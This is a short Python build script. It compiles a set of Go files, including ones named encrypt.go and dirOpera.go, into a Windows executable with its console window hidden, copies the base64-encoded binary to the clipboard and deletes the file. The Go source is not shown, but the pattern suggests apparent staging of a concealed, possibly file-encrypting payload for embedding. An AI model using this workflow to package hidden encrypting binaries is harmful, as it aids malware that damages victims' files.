import base64
import pyperclip as cb
import os

os.system('''go build -ldflags "-H=windowsgui" .\\main.go .\\file.go .\\encrypt.go .\\dirOpera.go .\\constVar.go .\\linkedVar.go''')

with open('main.exe', 'rb') as f:
    cb.copy(base64.b64encode(f.read()).decode())

os.system('''del main.exe''')